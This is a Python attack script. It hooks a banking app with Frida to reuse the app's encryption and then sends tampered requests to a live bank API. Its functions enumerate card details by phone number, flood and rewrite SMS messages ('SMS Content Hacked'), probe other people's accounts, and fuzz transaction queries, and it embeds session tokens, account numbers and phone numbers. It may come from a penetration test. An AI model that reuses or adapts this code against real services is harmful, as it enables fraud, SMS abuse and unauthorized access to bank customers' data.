"""Build http request using Frida RPC"""

import asyncio
from codecs import ignore_errors
import frida
import requests
import time
import sys
import os
import socket
import argparse

from request import sendRequest, sendSms
from utils.log import *
import binascii
import base64
import sys
import json
from utils.aes import AESDecrypt
import uuid
import httpx

encrypt = None
decrypt = None
getKey = None
getUuid = None


def frida_process_message(message, data):
    if message["type"] == "input":
        pass
    elif message["type"] == "send":
        body = message["payload"]
        if body["from"] == "/request":
            req_data = body["req_data"]
            sign = body["sign"]
            method = body["method"]
            logger.info(
                f"\nRequest Encryption\nreq_data:{req_data}\nsign:{sign}\nmethod:{method}"
            )
            # res = sendRequest(req_data, sign, method)
        if body["from"] == "/response":
            data = body["payload"]
            logger.info(
                f"\nResponse Decryption:\n{base64.b64decode(data).decode('utf8')}"
            )


proxy = {"https": "127.0.0.1:8082", "http": "127.0.0.1:8082"}


def request(url, body, session):
    cookies = {
        "SESSION": session,
    }
    headers = {
        "Connection": "close",
        "user-agent": "android",
        "Content-Type": "application/json; charset=utf-8",
        # 'Content-Length': '1209',
        "Host": "m.jhccb.com.cn:7009",
        # 'Accept-Encoding': 'gzip, deflate, br',
        # 'Cookie': 'SESSION=ae1810b2-28f8-49d2-9f45-2ed48ab8e5ca',
    }
    json_data = {
        "head": {
            "H_UPS_SID": "",
            "H_NONCE": "83cc3a34-ffc1-47d9-923e-753a57afe63d",
            "SYS_FROM": "3",
            "H_TIME": str(int(time.time() * 1000)),
            "H_CHNL_ID": "1005",
            "H_TIME_OFFSET": "-466",
        },
        "body": body,
    }
    response = requests.post(
        url,
        cookies=cookies,
        headers=headers,
        json=json_data,
        verify=False,
        proxies=proxy,
    )
    return response.text


async def async_request(client: httpx.AsyncClient, url, body, session):
    cookies = {
        "SESSION": session,
    }
    headers = {
        "Connection": "close",
        "user-agent": "android",
        "Content-Type": "application/json; charset=utf-8",
        # 'Content-Length': '1209',
        "Host": "m.jhccb.com.cn:7009",
        # 'Accept-Encoding': 'gzip, deflate, br',
        # 'Cookie': 'SESSION=ae1810b2-28f8-49d2-9f45-2ed48ab8e5ca',
    }
    json_data = {
        "head": {
            "H_UPS_SID": "",
            "H_NONCE": "83cc3a34-ffc1-47d9-923e-753a57afe63d",
            "SYS_FROM": "3",
            "H_TIME": str(int(time.time() * 1000)),
            "H_CHNL_ID": "1005",
            "H_TIME_OFFSET": "-466",
        },
        "body": body,
    }
    response: httpx.Response = await client.post(
        url,
        cookies=cookies,
        headers=headers,
        json=json_data,
        # verify=False,
        # proxies={"https": "127.0.0.1:8080"},
    )
    return body, response.text


sqlFuzz = "\"'()#--"


def get_card_number_by_phone():

    obj = {
        "CHNL_TYPE": "MB",
        "CLIENT_OS": "A",
        "REQ_TIME": "20240507163610",
        "INCORP_NO": "000",
        "Latitude": 29.085244,
        "Longitude": 119.572917,
        "telePhone": "13273487682",
        "CLIENT_NO": "db55df74a18ee538",
        "DEVICE_FINGERPRINT": "ZgEnuHIFjx-hYmcpFQVbwBp7n0QNJLkgKBfzgbMvbFgdq67Km8WtF4G_lklEL8Erc4cRVocwrAVQNAokJ3gHVvXMo1MMh_c6kTqzq26JoARU2y9t8iEg0I3fwmWeIzvxDzY6TWBSb6Q_iwkT2V1AoMSuNX5rcMwU",
        "CLIENT_INFO": "google Pixel 4",
        "OS_VERSION": "13",
        "name": "Aaa",
        "depositHandle": "",
        "CLIENT_LOGIN_FLAG": "1",
        "CLIENT_VER_NO": "5.0.2",
    }
    url = "https://m.jhccb.com.cn:7009/ares-inte-gateway/phoneTrans/cardInfoByPhone.do"
    session = "e094fb22-461b-4f19-86fa-67d988ef5840"
    for i in range(1):
        # obj["CLIENT_NO"] = "db55df74a18ee537"
        obj["telePhone"] = "13273487268"
        obj["name"] = ""
        print(f"\nrequest: {obj}\nresponse:")
        res = request(url, encrypt(json.dumps(obj)), session)
        try:
            o = json.loads(res)
            res_dec = decrypt(o["body"])
            if len(res_dec) == 0:
                print(res)
            else:
                print(res_dec)
        except:
            print(res)


def send_sms():

    obj = {
        "CHNL_TYPE": "MB",
        "CLIENT_OS": "A",
        "REQ_TIME": "20240507170102",
        "INCORP_NO": "000",
        "amt": "0.01",
        "Latitude": 29.085244,
        "mobileNo": "19834535230",
        "Longitude": 119.572917,
        "STEP_TOKEN": "T20240507165654023000013908469",
        "CLIENT_NO": "db55df74a18ee538",
        "DEVICE_FINGERPRINT": "ZgEnuHIFjx-hYmcpFQVbwBp7n0QNJLkgKBfzgbMvbFgdq67Km8WtF4G_lklEL8Erc4cRVocwrAVQNAokJ3gHVvXMo1MMh_c6kTqzq26JoARU2y9t8iEg0I3fwmWeIzvxDzY6TWBSb6Q_iwkT2V1AoMSuNX5rcMwU",
        "tranType": "1",
        "recvacc": "6226227714184052",
        "CLIENT_INFO": "google Pixel 4",
        "befCheckUrl": "transfer/cardTrans",
        "OS_VERSION": "13",
        "payacc": "6224490110801982",
        "CLIENT_LOGIN_FLAG": "1",
        "skipStepFlag": "1",
        "CLIENT_VER_NO": "5.0.2",
    }
    url = "https://m.jhccb.com.cn:7009/ares-inte-gateway/sms/smsSend.do"
    session = "e094fb22-461b-4f19-86fa-67d988ef5840"
    phone_list = list()
    for i in range(10):
        phone_list.append("13273487268")
        phone_list.append("15657157268")
    for i in phone_list:
        obj["mobileNo"] = i
        print(f"\nrequest: {obj}\nresponse:")
        res = request(url, encrypt(json.dumps(obj)), session)
        try:
            o = json.loads(res)
            res_dec = decrypt(o["body"])
            if len(res_dec) == 0:
                print(res)
            else:
                print(res_dec)
        except:
            print(res)


def test():

    obj = {
        "CHNL_TYPE": "MB",
        "CLIENT_OS": "A",
        "REQ_TIME": "20240508100843",
        "INCORP_NO": "000",
        "Latitude": 29.08519,
        "Longitude": 119.572807,
        "CustNo": "9118214006",
        "CLIENT_NO": "db55df74a18ee538",
        "DEVICE_FINGERPRINT": "ZovAaVwJPF64ZkJ1oAkKOAoiAKGx-rgM2LGVGfNgQFDAdv1lYjvTGgevEQjf4zOyu5Y_4yH3yUFlgSIn0MuU9JnlOSrhDIAlyhFWAPWznaw01O7QfXziHJ4QB_FQgb-wRaqJV1M-6y1Dki0GbxHAPJjmFutw3WRS",
        "CLIENT_INFO": "google Pixel 4",
        "OS_VERSION": "13",
        "CLIENT_LOGIN_FLAG": "1",
        "CLIENT_VER_NO": "5.0.2",
    }
    url = "https://m.jhccb.com.cn:7009/ares-inte-gateway/cash/prodQueryCashingWithoutCard.do"
    session = "acec15cf-e414-4d7f-9c8e-3c552663dc04"
    for i in range(1):
        obj["acctno"] = "6226227714184052"
        print(f"\nrequest: {obj}\nresponse:")
        res = request(url, encrypt(json.dumps(obj)), session)
        try:
            o = json.loads(res)
            res_dec = decrypt(o["body"])
            if len(res_dec) == 0:
                print(res)
            else:
                print(res_dec)
        except:
            print(res)


def sms_tamper():

    obj = {
        "CHNL_TYPE": "MB",
        "CLIENT_OS": "A",
        "REQ_TIME": "20240508091713",
        "INCORP_NO": "000",
        "Latitude": 29.085236,
        "mobileNo": "13273487268",
        "Longitude": 119.572882,
        "CLIENT_NO": "db55df74a18ee538",
        "DEVICE_FINGERPRINT": "B4vKzxIBF3wsKuhR2X2cC15kAElESxKGGpPRnrqzvsqXo4Q-phhHqjFSl5Y5aK_wvgeYhn80PL5sbFZxvdVRAdDSFcODA7BoXX2aCjL2mh4eXx_5l9nI7o7hNWdfZVoQkbB95EHRzocxpsVqWw-KFb8i69tOhX3g",
        "CLIENT_INFO": "google Pixel 4",
        "OS_VERSION": "13",
        "smsContent": "SMS Content Hacked: https://www.nsfocus.com",
        "CLIENT_LOGIN_FLAG": "1",
        "CLIENT_VER_NO": "5.0.2",
    }
    url = "https://m.jhccb.com.cn:7009/ares-inte-gateway/sms/smsSendMsg.do"
    session = "88b9e324-f4d4-4036-971e-9b3879f5e43f"
    phone_list = list()

    async def main():
        client = httpx.AsyncClient(proxies="http://127.0.0.1:8082", verify=False)
        tasks = list()

        for i in range(15):
            phone_list.append("13273487268")
            phone_list.append("15657157268")
        for i, phone in enumerate(phone_list):
            obj["mobileNo"] = phone
            obj["smsContent"] = (
                "SMS Content Hacked: https://www.nsfocus.com" + f", count: {i}"
            )
            # obj["acctno"] = "6226227714184052"
            tasks.append(
                asyncio.create_task(
                    async_request(client, url, encrypt(json.dumps(obj)), session)
                )
            )
        for task in asyncio.as_completed(tasks):
            body, res = await task
            print(f"\nrequest: {body}\nresponse:")
            try:
                o = json.loads(res)
                res_dec = decrypt(o["body"])
                if len(res_dec) == 0:
                    print(res)
                else:
                    print(res_dec)
            except:
                print(res)

    asyncio.run(main())


def interactive():

    obj = {
        "CLIENT_OS": "A",
        "SEARCH_INFO": "",
        "END_DATE": "2024-05-07",
        "Latitude": 29.085236,
        "loancn": "",
        "frozdt": "",
        "pdblsq": "",
        "NEXT_KEY": "1",
        "BEGIN_DATE": "2024-05-07",
        "CLIENT_INFO": "google Pixel 4",
        "ID": "",
        "CLIENT_VER_NO": "5.0.2",
        "frozsq": "",
        "CHNL_TYPE": "MB",
        "REQ_TIME": "20240507172809",
        "pdtndt": "",
        "INCORP_NO": "000",
        "Longitude": 119.572882,
        "lncfno": "",
        "CLIENT_NO": "db55df74a18ee538",
        "DEVICE_FINGERPRINT": "OPmRyOoiV5hU4w4O-M315yc4qO8kkxX3c7GYSxBY_lrQcoKTPG_-e5Jgr2forWXgz2RqwQ8TJk3SXRydW51DZ85X_vmRB17fiWexMxdUKFRCwdPakABKu3khS4FLYgylGkamyPdVL9TVi9aSH3NIYW6IXxbhD2bk",
        "pdsbac": "",
        "pretrandtMon": "",
        "needQuery": "",
        "OS_VERSION": "13",
        "PAGE_SIZE": "5",
        "QRY_ACCOUNT": '{"hasPassbook":"0","MSG":"交易成功","STATUS":"1","hasDebit":"1","hasCredit":"0","hasEleacct":"0","LIST":[{"ACCT_SORT":"0","dcmttp":"1001","ACCT_SIGN_ORG":"970401","CUST_NO":"C20240417161733033000000008726","ACCT_ADD_DATE":"20240417","ACCTSTATUS":"0","dcmtno":"0011080198","ACCT":"6224490110801982","ACCT_SIGN_ORG_NAME":"杭州萧山支行","ACCT_AMT_LOAN":"0","ACCT_TYPE":"1","ACCT_CRCYCD":"156","ACCT_LVL":"1","ACCT_ALIAS":"","IS_DEFT_ACCT":"N","ACCT_ADD_CHNL":"2","USA_BLE_BAL":"0.99"}],"USA_BLE_BAL":"9999999.0","ACCT":"6224490110801982"}',
        "CLIENT_LOGIN_FLAG": "1",
    }
    url = "https://m.jhccb.com.cn:7009/ares-inte-gateway/transRecode/qryTransInfo.do"
    session = "d08c8c66-5085-4fa0-a180-6d4a22316443"
    while True:
        msg = input(
            "[#R]<key>=<value>(separate by comma, #R to replace, #Rkey=11:22): "
        )
        if msg == "exit":
            break
        sub_msgs = msg.split(",")
        for msg in sub_msgs:
            if msg.startswith("#R"):
                msg = msg[2:]
                key, value = msg.split("=")[0], msg.split("=")[1]
                before, after = value.split(":")[0], value.split(":")[1]
                obj[key.strip()] = str(obj[key.strip()]).replace(before, after)

            key, value = msg.split("=")[0], msg.split("=")[1]
            obj[key.strip()] = str(value).strip()
        print(f"\nrequest: {obj}\nresponse:")
        res = request(url, encrypt(json.dumps(obj)), session)
        try:
            o = json.loads(res)
            res_dec = decrypt(o["body"])
            if len(res_dec) == 0:
                print(res)
            else:
                print(res_dec)
        except:
            print(res)


def main():
    global encrypt
    global decrypt, getKey, getUuid
    while True:
        if getKey() is None or getUuid() is None:
            print(f"Trigger a request first, waiting...")
            time.sleep(0.5)
        else:
            break
    test()
    # interactive()
    # sms_tamper()
    # send_sms()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python client.py <script_name>")
        exit(0)
    process_name = "金银钱包"
    script_name = sys.argv[1]

    device = frida.get_remote_device()
    device = frida.get_device_manager().add_remote_device("192.168.43.230:3333")
    process = device.attach(process_name)

    with open(script_name, encoding="utf-8", errors="ignore") as f:
        script = process.create_script(f.read())
    script.on("message", frida_process_message)
    script.load()
    logger.info("Load Script")

    logger.info(script.list_exports_sync())

    encrypt = script.exports_sync.encrypt
    decrypt = script.exports_sync.decrypt
    getKey = script.exports_sync.key
    getUuid = script.exports_sync.uuid

    # print(encrypt("aaaa", "bbb"))
    # print(
    #     decrypt(
    #         "MIIBjAYKKoEcz1UGAQQCA6CCAXwwggF4AgEBMYH1MIHyAgEBMGQwWzELMAkGA1UEBhMCQ04xMDAuBgNVBAoMJ0NoaW5hIEZpbmFuY2lhbCBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTEaMBgGA1UEAwwRQ0ZDQSBDUyBTTTIgT0NBMTECBSBTY2REMAsGCSqBHM9VAYItAwR6MHgCIHDhFrFtkSSoFm8LKFj0LfnWUtjq0/6ry+sL2l0hujc5AiAOkIUeGJXyyJvETLNOShfekv1BDUlXFKVSl7nlRxiKMAQgbI1gAXY2IR372AAxr+XfaOFQT1uE6EpyvYmRQFsqaTYEEO5q3QZ5lrp2P0BbernZhMswewYKKoEcz1UGAQQCATAbBgcqgRzPVQFoBBBFJ+8L12KZAyBCj27Ly2ORgFB6WNpJPctfJXL6lz/Q/SILdychbHx3MpabFrXVFwDkJE+hbw0JcL9MA20KLajpv2wCRu0goWN8XyaI5sI9X4mTZudzvNSYxhSK01qQJJ3ZGw=="
    #     )
    # )
    main()
    # script.post({"type": "input", "method": "encrypt", "payload": ["aa", "bb"]})
